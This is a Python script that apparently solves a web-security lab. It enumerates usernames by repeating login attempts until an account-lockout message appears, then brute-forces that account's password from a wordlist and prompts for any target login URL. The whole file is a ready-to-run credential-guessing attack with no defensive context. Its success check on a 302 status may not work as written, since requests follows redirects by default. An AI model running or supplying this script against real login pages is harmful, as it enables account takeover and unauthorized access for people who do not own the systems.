import requests

def load_payloads(filepath):
    with open(filepath, 'r') as file:
        return [line.strip() for line in file]

def test_username_lockout(url, usernames_path, passwords_path):
    # Load payloads
    usernames = load_payloads(usernames_path)
    passwords = load_payloads(passwords_path)

    # Step 1: Cluster Bomb Attack
    print("Starting Cluster Bomb attack...")
    locked_username = None

    for username in usernames:
        for _ in range(5):  # Test each username 5 times
            payload = {
                'username': username,
                'password': 'dummy'
            }
            try:
                response = requests.post(url, data=payload)
                response.raise_for_status()  # Raise an HTTPError for bad responses
                if "You have made too many incorrect login attempts" in response.text:
                    locked_username = username
                    print(f"Locked username found: {username}")
                    break
            except requests.RequestException as e:
                print(f"Request failed: {e}")
        if locked_username:
            break
    
    if not locked_username:
        print("No locked username found.")
        return

    # Step 2: Sniper Attack
    print(f"Starting Sniper attack for username: {locked_username}...")
    found_password = None

    for password in passwords:
        payload = {
            'username': locked_username,
            'password': password
        }
        try:
            response = requests.post(url, data=payload)
            response.raise_for_status()  # Raise an HTTPError for bad responses
            if response.status_code == 302:  # Assuming 302 indicates a successful login
                found_password = password
                print(f"Login attempt with password '{password}' succeeded.")
                break
            else:
                print(f"Login attempt with password '{password}' returned status code {response.status_code}.")
        except requests.RequestException as e:
            print(f"Request failed: {e}")
    
    if found_password:
        print(f"Valid password found: {found_password}")
    else:
        print("No valid password found.")

# Input paths
login_url = input("Enter the login URL (e.g., http://target.com/login): ").strip()
username_file_path = input("Enter the path to the username list file: ").strip()
password_file_path = input("Enter the path to the password list file: ").strip()

test_username_lockout(login_url, username_file_path, password_file_path)
